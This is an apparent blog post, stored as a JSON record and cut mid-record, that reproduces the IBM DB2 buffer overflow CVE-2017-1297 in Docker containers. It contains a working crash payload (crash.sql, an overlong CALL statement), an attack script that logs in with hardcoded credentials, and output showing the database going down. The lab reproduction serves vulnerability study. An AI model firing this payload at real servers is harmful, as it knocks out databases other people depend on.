\\\n      groupadd -g 903 dasadm1  && \\\n      useradd -g db2iadm1 -u 801 -d /home/db2inst1 -m  db2inst1 && \\ \n      useradd -g db2fadm1 -u 802 -d /home/db2fenc1 -m db2fenc1 && \\\n      useradd -g dasadm1 -u 803 -d /home/dasadm1 -m dasusr1 &&\\\n      echo 'db2inst1:123456' | chpasswd\n\n\n\n  # CMD [\"tail\",'-f','/dev/null']\n\n  # RUN cd server && ./db2prereqcheck &&  echo 'ESE' | ./db2_install -b /opt/ibm/db2/V9.7 || echo pass\n  # RUN cd /opt/ibm/db2/V9.7/instance && ./dascrt -u dasusr1  &&\\\n  #     ./db2icrt -u db2inst1 db2inst1 \n\n\n  # RUN db2 create database KHYX_YS using codeset GBK territory CN\n  # RUN db2 create database KHYX_YS \n  # RUN db2set –all\n  COPY entrypoint.sh /entrypoint.sh\n  COPY exp.sh /exp.sh\n  COPY select.sql /select.sql\n  COPY crash.sql /crash.sql\n\n  RUN chmod +x /entrypoint.sh\n  RUN chmod +x /exp.sh\n\n  ENV REMOTE_IP=${REMOTE_IP}\n  ENV REMOTE_PORT=${REMOTE_PORT}\n  ENTRYPOINT [\"/entrypoint.sh\"]\n\n\n  # CMD ['REMOTE_IP']\n\n  # CMD [\"tail\",'-f','/dev/null']\n\n\n  EXPOSE 60000\n  ```\n\n- 镜像构建（获得docker_image_id_1）\n  ```sh\n  docker build .\n  ```\n\n\n## 被测环境搭建\n\n- `create_table.sql`:\n  ```sql\n  CREATE DATABASE testdb3\n  connect to testdb3\n\n  CREATE TABLE tbl4 (stu_name CHAR(10) NOT NULL PRIMARY KEY)\n  ALTER TABLE tbl4 ADD COLUMN stu_age CHAR(10)\n  INSERT INTO tbl4 VALUES ('alice','20')\n  INSERT INTO tbl4 VALUES ('bob','16')\n  INSERT INTO tbl4 VALUES ('tom','19')\n  INSERT INTO tbl4 VALUES ('john','32')\n  INSERT INTO tbl4 VALUES ('amy','13')\n  INSERT INTO tbl4 VALUES ('france','56')\n  INSERT INTO tbl4 VALUES ('frank','41')\n\n  SELECT * FROM tbl4\n  ```\n- `entrypoint.sh`:\n  ```sh\n  #!/bin/bash\n  cd server && ./db2prereqcheck &&  echo 'ESE' | ./db2_install -b /opt/ibm/db2/V9.7 || echo pass\n  cd /opt/ibm/db2/V9.7/instance && ./dascrt -u dasusr1  \n  ./db2icrt -u db2inst1 db2inst1 \n\n  su - db2inst1 -c \"db2set DB2COMM=TCPIP\"\n  su - db2inst1 -c \"db2 update dbm cfg using SVCENAME 60000\"\n  su - db2inst1 -c \"db2stop\"\n  su - db2inst1 -c \"db2start\"\n\n  su - db2inst1 -c \"cd / && db2 -f create_table.sql\"\n  ```\n- `Dockerfile`:\n  ```sh\n  FROM centos:7.2.1511\n\n  COPY v9.7_linuxx64_server.tar.gz v9.7_linuxx64_server.tar.gz\n  # COPY sysctl.conf /etc/sysctl.conf\n\n\n  RUN tar -xzvf v9.7_linuxx64_server.tar.gz\n  RUN rm v9.7_linuxx64_server.tar.gz\n  RUN yum install -y libstdc++ libstdc++.so.6 libaio\n\n  RUN ipcs -l\n\n  RUN groupadd -g 901 db2iadm1 && \\\n      groupadd -g 902 db2fadm1 && \\\n      groupadd -g 903 dasadm1  && \\\n      useradd -g db2iadm1 -u 801 -d /home/db2inst1 -m  db2inst1 && \\ \n      useradd -g db2fadm1 -u 802 -d /home/db2fenc1 -m db2fenc1 && \\\n      useradd -g dasadm1 -u 803 -d /home/dasadm1 -m dasusr1 &&\\\n      echo 'db2inst1:123456' | chpasswd\n\n  COPY entrypoint.sh /entrypoint.sh\n  # COPY exp.sh /exp.sh\n  COPY create_table.sql /create_table.sql\n  # COPY crash.sql /crash.sql\n\n  RUN chmod +x /entrypoint.sh\n  # RUN chmod +x /exp.sh\n\n  # ENV REMOTE_IP=${REMOTE_IP}\n\n\n\n  ENTRYPOINT [\"/entrypoint.sh\"]\n\n  EXPOSE 60000\n  # CMD ['REMOTE_IP']\n\n  # CMD [\"tail\",'-f','/dev/null']\n  ```\n\n- 镜像构建（获得docker_image_id_2）\n  ```sh\n  docker build.\n  ```\n\n## 被测环境容器启动（比较慢）\n\n```sh\ndocker run -it -d --privileged -p 60000:60000  docker_image_id_2\n```\n\n## 攻击脚本执行 \n\n```sh\n# REMOTE_IP为被测环境的ip\n# REMOTE_PORT为被测环境的端口\n# docker_image_id_1 为攻击镜像id\n\ndocker run --network host -it -d --privileged -e REMOTE_IP='192.168.33.44' -e REMOTE_PORT='60000' docker_image_id_1\n```\n\n\n## 攻击成功效果\n\n```sh\n……（此处省略n行）……\n\n[+] 已连接成功目标数据库\n[+] 正在查询目标数据库数据\n\nSTU_NAME   STU_AGE   \n---------- ----------\nalice      20        \nbob        16        \ntom        19        \njohn       32        \namy        13        \nfrance     56        \nfrank      41        \n\n7 record(s) selected.\n\n\n[+] 正在发送PoC\n[+] PoC发送成功\n[+] 再次尝试查询数据库\nSQL1024N  A database connection does not exist.  SQLSTATE=08003\n```","source":"_posts/CVE-2017-1297漏洞复现.md","raw":"---\ntitle: CVE-2017-1297漏洞复现\ndate: 2024-01-14 23:14:39\ntags:\n    - CVE-2017-1297\ncategories:\n    - 漏洞复现\n---\n\n## 参考链接\n\n[IBM DB2 9.7/10.1/10.5/11.1 - Command Line Processor Buffer Overflow - Multiple dos Exploit](https://www.exploit-db.com/exploits/42260)\n\n## 漏洞说明\n\n> IBM DB2 for Linux, UNIX and Windows 9.2, 10.1, 10.5, and 11.1 (includes DB2 Connect Server) is vulnerable to a stack-based buffer overflow, caused by improper bounds checking which could allow a local attacker to execute arbitrary code.\n\n## 攻击镜像构建\n\n- `exp.sh`:\n  ```sh\n  #!/bin/bash\n  echo \"[+] 正在准备连接目标db2数据库\"\n  echo $1\n  echo $2\n  db2 catalog tcpip4 node remotedb remote $1 server $2\n  db2 catalog database testdb3 as testdb33 at node remotedb\n  db2 connect to testdb33 user db2inst1 using 123456\n  echo \"[+] 已连接成功目标数据库\"\n  echo \"[+] 正在查询目标数据库数据\"\n  # 查询数据\n  db2 -f select.sql\n  echo \"[+] 正在发送PoC\"\n  # 发送 PoC\n  db2 -f crash.sql\n  echo \"[+] PoC发送成功\"\n  echo \"[+] 再次尝试查询数据库\"\n  db2 -f select.sql\n  ```\n- `select.sql`:\n  ```sql\n  select * from tbl4\n  ```\n- `crash.sql`:\n  ```sql\n  CALL AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA;\n  ```\n- `entrypoint.sh`:\n  ```sh\n  #!/bin/bash\n  cd server && ./db2prereqcheck &&  echo 'ESE' | ./db2_install -b /opt/ibm/db2/V9.7 || echo pass\n  cd /opt/ibm/db2/V9.7/instance && ./dascrt -u dasusr1  \n  ./db2icrt -u db2inst1 db2inst1 \n  su - db2inst1 -c \"db2start\"\n\n  su - db2inst1 -c \"db2set DB2COMM=TCPIP\"\n  su - db2inst1 -c \"db2 update dbm cfg using SVCENAME 60000\"\n  su - db2inst1 -c \"db2stop\"\n  su - db2inst1 -c \"db2start\"\n\n  echo \"finish\"\n  echo \"Remote IP: $REMOTE_IP\"\n  echo \"Remote PORT: $REMOTE_PORT\"\n  # STR=$(echo $3 | cut -d \"[\" -f 2 |cut -d  \"]\" -f 1 | cut -d \"'\" -f 2)\n  # echo $STR\n  su - db2inst1 -c \"cd / && bash /exp.sh $REMOTE_IP $REMOTE_PORT\"\n\n  tail -f /dev/null\n  ```\n- `Dockerfile`:\n  ```sh\n  FROM centos:7.2.1511\n\n  COPY v9.7_linuxx64_server.tar.gz v9.7_linuxx64_server.tar.gz\n  # COPY sysctl.conf /etc/sysctl.conf\n\n\n  RUN tar -xzvf v9.7_linuxx64_server.tar.gz\n  RUN rm v9.7_linuxx64_server.tar.gz\n  RUN yum install -y libstdc++ libstdc++.so.6 libaio\n\n\n  # RUN chmod 644 /etc/sysctl.conf\n  # RUN sysctl -p \n  RUN ipcs -l\n\n  RUN groupadd -g 901 db2iadm1 && \\\n      groupadd -g 902 db2fadm1 && \\\n      groupadd -g 903 dasadm1  && \\\n      useradd -g db2iadm1 -u 801 -d /home/db2inst1 -m  db2inst1 && \\ \n      useradd -g db2fadm1 -u 802 -d /home/db2fenc1 -m db2fenc1 && \\\n      useradd -g dasadm1 -u 803 -d /home/dasadm1 -m dasusr1 &&\\\n      echo 'db2inst1:123456' | chpasswd\n\n\n\n  # CMD [\"tail\",'-f','/dev/null']\n\n  # RUN cd server && ./db2prereqcheck &&  echo 'ESE' | ./db2_install -b /opt/ibm/db2/V9.7 || echo pass\n  # RUN cd /opt/ibm/db2/V9.7/instance && ./dascrt -u dasusr1  &&\\\n  #     ./db2icrt -u db2inst1 db2inst1 \n\n\n  # RUN db2 create database KHYX_YS using codeset GBK territory CN\n  # RUN db2 create database KHYX_YS \n  # RUN db2set –all\n  COPY entrypoint.sh /entrypoint.sh\n  COPY exp.sh /exp.sh\n  COPY select.sql /select.sql\n  COPY crash.sql /crash.sql\n\n  RUN chmod +x /entrypoint.sh\n  RUN chmod +x /exp.sh\n\n  ENV REMOTE_IP=${REMOTE_IP}\n  ENV REMOTE_PORT=${REMOTE_PORT}\n  ENTRYPOINT [\"/entrypoint.sh\"]\n\n\n  # CMD ['REMOTE_IP']\n\n  # CMD [\"tail\",'-f','/dev/null']\n\n\n  EXPOSE 60000\n  ```\n\n- 镜像构建（获得docker_image_id_1）\n  ```sh\n  docker build .\n  ```\n\n\n## 被测环境搭建\n\n- `create_table.sql`:\n  ```sql\n  CREATE DATABASE testdb3\n  connect to testdb3\n\n  CREATE TABLE tbl4 (stu_name CHAR(10) NOT NULL PRIMARY KEY)\n  ALTER TABLE tbl4 ADD COLUMN stu_age CHAR(10)\n  INSERT INTO tbl4 VALUES ('alice','20')\n  INSERT INTO tbl4 VALUES ('bob','16')\n  INSERT INTO tbl4 VALUES ('tom','19')\n  INSERT INTO tbl4 VALUES ('john','32')\n  INSERT INTO tbl4 VALUES ('amy','13')\n  INSERT INTO tbl4 VALUES ('france','56')\n  INSERT INTO tbl4 VALUES ('frank','41')\n\n  SELECT * FROM tbl4\n  ```\n- `entrypoint.sh`:\n  ```sh\n  #!/bin/bash\n  cd server && ./db2prereqcheck &&  echo 'ESE' | ./db2_install -b /opt/ibm/db2/V9.7 || echo pass\n  cd /opt/ibm/db2/V9.7/instance && ./dascrt -u dasusr1  \n  ./db2icrt -u db2inst1 db2inst1 \n\n  su - db2inst1 -c \"db2set DB2COMM=TCPIP\"\n  su - db2inst1 -c \"db2 update dbm cfg using SVCENAME 60000\"\n  su - db2inst1 -c \"db2stop\"\n  su - db2inst1 -c \"db2start\"\n\n  su - db2inst1 -c \"cd / && db2 -f create_table.sql\"\n  ```\n- `Dockerfile`:\n  ```sh\n  FROM centos:7.2.1511\n\n  COPY v9.7_linuxx64_server.tar.gz v9.7_linuxx64_server.tar.gz\n  # COPY sysctl.conf /etc/sysctl.conf\n\n\n  RUN tar -xzvf v9.7_linuxx64_server.tar.gz\n  RUN rm v9.7_linuxx64_server.tar.gz\n  RUN yum install -y libstdc++ libstdc++.so.6 libaio\n\n  RUN ipcs -l\n\n  RUN groupadd -g 901 db2iadm1 && \\\n      groupadd -g 902 db2fadm1 && \\\n      groupadd -g 903 dasadm1  && \\\n      useradd -g db2iadm1 -u 801 -d /home/db2inst1 -m  db2inst1 && \\ \n      useradd -g db2fadm1 -u 802 -d /home/db2fenc1 -m db2fenc1 && \\\n      useradd -g dasadm1 -u 803 -d /home/dasadm1 -m dasusr1 &&\\\n      echo 'db2inst1:123456' | chpasswd\n\n  COPY entrypoint.sh /entrypoint.sh\n  # COPY exp.sh /exp.sh\n  COPY create_table.sql /create_table.sql\n  # COPY crash.sql /crash.sql\n\n  RUN chmod +x /entrypoint.sh\n  # RUN chmod +x /exp.sh\n\n  # ENV REMOTE_IP=${REMOTE_IP}\n\n\n\n  ENTRYPOINT [\"/entrypoint.sh\"]\n\n  EXPOSE 60000\n  # CMD ['REMOTE_IP']\n\n  # CMD [\"tail\",'-f','/dev/null']\n  ```\n\n- 镜像构建（获得docker_image_id_2）\n  ```sh\n  docker build.\n  ```\n\n## 被测环境容器启动（比较慢）\n\n```sh\ndocker run -it -d --privileged -p 60000:60000  docker_image_id_2\n```\n\n## 攻击脚本执行 \n\n```sh\n# REMOTE_IP为被测环境的ip\n# REMOTE_PORT为被测环境的端口\n# docker_image_id_1 为攻击镜像id\n\ndocker run --network host -it -d --privileged -e REMOTE_IP='192.168.33.44' -e REMOTE_PORT='60000' docker_image_id_1\n```\n\n\n## 攻击成功效果\n\n```sh\n……（此处省略n行）……\n\n[+] 已连接成功目标数据库\n[+] 正在查询目标数据库数据\n\nSTU_NAME   STU_AGE   \n---------- ----------\nalice      20        \nbob        16        \ntom        19        \njohn       32        \namy        13        \nfrance     56        \nfrank      41        \n\n7 record(s) selected.\n\n\n[+] 正在发送PoC\n[+] PoC发送成功\n[+] 再次尝试查询数据库\nSQL1024N  A database connection does not exist.  SQLSTATE=08003\n```","slug":"CVE-2017-1297漏洞复现","published":1,"updated":"2024-01-14T15:32:46.384Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clrkqvvim0001foi80p2c3011","content":"<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><p><a href=\"https://www.exploit-db.com/exploits/42260\">IBM DB2 9.7&#x2F;10.1&#x2F;10.5&#x2F;11.1 - Command Line Processor Buffer Overflow - Multiple dos Exploit</a></p>\n<h2 id=\"漏洞说明\"><a href=\"#漏洞说明\" class=\"headerlink\" title=\"漏洞说明\"></a>漏洞说明</h2><blockquote>\n<p>IBM DB2 for Linux, UNIX and Windows 9.2, 10.1, 10.5, and 11.1 (includes DB2 Connect Server) is vulnerable to a stack-based buffer overflow, caused by improper bounds checking which could allow a local attacker to execute arbitrary code.</p>\n</blockquote>\n<h2 id=\"攻击镜像构建\"><a href=\"#攻击镜像构建\" class=\"headerlink\" title=\"攻击镜像构建\"></a>攻击镜像构建</h2><ul>\n<li><p><code>exp.sh</code>:</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;[+] 正在准备连接目标db2数据库&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$1</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$2</span></span><br><span class=\"line\">db2 catalog tcpip4 node remotedb remote <span class=\"variable\">$1</span> server <span class=\"variable\">$2</span></span><br><span class=\"line\">db2 catalog database testdb3 as testdb33 at node remotedb</span><br><span class=\"line\">db2 connect to testdb33 user db2inst1 using 123456</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;[+] 已连接成功目标数据库&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;[+] 正在查询目标数据库数据&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># 查询数据</span></span><br><span class=\"line\">db2 -f select.sql</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;[+] 正在发送PoC&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># 发送 PoC</span></span><br><span class=\"line\">db2 -f crash.sql</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;[+] PoC发送成功&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;[+] 再次尝试查询数据库&quot;</span></span><br><span class=\"line\">db2 -f select.sql</span><br></pre></td></tr></table></figure></li>\n<li><p><code>select.sql</code>:</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> tbl4</span><br></pre></td></tr></table></figure></li>\n<li><p><code>crash.sql</code>:</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">CALL</span> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA;</span><br></pre></td></tr></table></figure></li>\n<li><p><code>entrypoint.sh</code>:</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> server &amp;&amp; ./db2prereqcheck &amp;&amp;  <span class=\"built_in\">echo</span> <span class=\"string\">&#x27;ESE&#x27;</span> | ./db2_install -b /opt/ibm/db2/V9.7 || <span class=\"built_in\">echo</span> pass</span><br><span class=\"line\"><span class=\"built_in\">cd</span> /opt/ibm/db2/V9.7/instance &amp;&amp; ./dascrt -u dasusr1  </span><br><span class=\"line\">./db2icrt -u db2inst1 db2inst1 </span><br><span class=\"line\">su - db2inst1 -c <span class=\"string\">&quot;db2start&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">su - db2inst1 -c <span class=\"string\">&quot;db2set DB2COMM=TCPIP&quot;</span></span><br><span class=\"line\">su - db2inst1 -c <span class=\"string\">&quot;db2 update dbm cfg using SVCENAME 60000&quot;</span></span><br><span class=\"line\">su - db2inst1 -c <span class=\"string\">&quot;db2stop&quot;</span></span><br><span class=\"line\">su - db2inst1 -c <span class=\"string\">&quot;db2start&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;finish&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;Remote IP: <span class=\"variable\">$REMOTE_IP</span>&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;Remote PORT: <span class=\"variable\">$REMOTE_PORT</span>&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># STR=$(echo $3 | cut -d &quot;[&quot; -f 2 |cut -d  &quot;]&quot; -f 1 | cut -d &quot;&#x27;&quot; -f 2)</span></span><br><span class=\"line\"><span class=\"comment\"># echo $STR</span></span><br><span class=\"line\">su - db2inst1 -c <span class=\"string\">&quot;cd / &amp;&amp; bash /exp.sh <span class=\"variable\">$REMOTE_IP</span> <span class=\"variable\">$REMOTE_PORT</span>&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">tail</span> -f /dev/null</span><br></pre></td></tr></table></figure></li>\n<li><p><code>Dockerfile</code>:</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FROM centos:7.2.1511</span><br><span class=\"line\"></span><br><span class=\"line\">COPY v9.7_linuxx64_server.tar.gz v9.7_linuxx64_server.tar.gz</span><br><span class=\"line\"><span class=\"comment\"># COPY sysctl.conf /etc/sysctl.conf</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">RUN tar -xzvf v9.7_linuxx64_server.tar.gz</span><br><span class=\"line\">RUN <span class=\"built_in\">rm</span> v9.7_linuxx64_server.tar.gz</span><br><span class=\"line\">RUN yum install -y libstdc++ libstdc++.so.6 libaio</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># RUN chmod 644 